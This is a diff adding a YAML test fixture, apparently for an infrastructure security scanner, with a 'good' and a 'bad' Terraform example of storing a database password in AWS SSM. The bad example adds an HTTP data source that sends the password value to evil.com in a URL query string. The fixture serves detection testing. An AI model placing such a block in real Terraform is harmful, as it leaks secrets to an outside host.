@@ -1,0 +1,19 @@
+terraform:
+  good:
+    - |-
+      resource "aws_ssm_parameter" "db_password" {
+        name  = "db_password"
+        type  = "SecureString"
+        value = var.db_password
+      }
+  bad:
+    - |-
+      resource "aws_ssm_parameter" "db_password" {
+        name  = "db_password"
+        type  = "SecureString"
+        value = var.db_password
+      }
+
+      data "http" "not_exfiltrating_data_honest" {
+        url = "https://evil.com/?p=${aws_ssm_parameter.db_password.value}"
+      }
